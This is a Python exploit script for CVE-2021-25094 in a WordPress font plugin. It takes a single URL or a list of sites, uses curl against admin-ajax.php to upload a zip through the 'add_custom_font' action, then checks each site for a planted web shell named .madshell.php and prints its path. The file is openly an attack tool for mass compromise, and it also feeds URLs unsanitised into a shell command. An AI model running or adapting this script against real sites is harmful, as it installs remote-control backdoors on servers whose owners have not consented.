from sys import argv
from os import system
import requests as req
import platform
from colorama import Fore

if platform.system() == 'Windows':
    hapus = 'cls'
else:
    hapus = 'clear'
    
P = Fore.WHITE
U = Fore.MAGENTA
B = Fore.BLUE
H = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
M = Fore.RED

banner = """
 _____                 _   _ _   _ ____
|_   _|   _ _ __   ___| | | | | | | __ )
  | || | | | '_ \ / _ \ |_| | | | |  _\ \ 
  | || |_| | |_) |  __/  _  | |_| | |_) |
  |_| \__, | .__/ \___|_| |_|\___/|____/
      |___/|_|
  CVE-2021-25094 
  
  Author : AdliXSec 
  mass : python hub.py -m listweb.txt
  
"""

try:
    system(hapus)
    print(banner)
    if argv[1] == '-m' and len(argv[2])>0:
        url = open(argv[2], 'r')
        for URL in url.read().splitlines():
            system('curl {}/wp-admin/admin-ajax.php -F "action=add_custom_font" -F "file=@dlixploit.zip"'.format(URL))
            print('\n')
            path = "wp-content/uploads/typehub/custom/dlixploit/.madshell.php"
            r = req.get('{}/{}'.format(URL, path))
            if r.status_code == 404:
                print("Not Vulnerable")
                print(M+"===================================================================================")
            elif r.status_code == 200:
                print("GOT RESPONSE : {}".format(r.status_code))
                print('PATH : {}/wp-content/uploads/typehub/custom/dlixploit/.madshell.php'.format(URL))
                print(M+"===================================================================================")
except:
    system(hapus)
    print(banner)
    URL = input("masukkan url : ")
    system('curl {}/wp-admin/admin-ajax.php -F "action=add_custom_font" -F "file=@dlixploit.zip"'.format(URL))
    print('\n')
    path = "wp-content/uploads/typehub/custom/dlixploit/.madshell.php"
    r = req.get('{}/{}'.format(URL, path))
    if r.status_code == 404:
        print(M+"Not Vulnerable")
    elif r.status_code == 200:
        print("{}GOT RESPONSE : {}{}".format(Y, P, r.status_code))
        print('{}PATH : {}{}/wp-content/uploads/typehub/custom/dlixploit/.madshell.php'.format(Y, C, URL))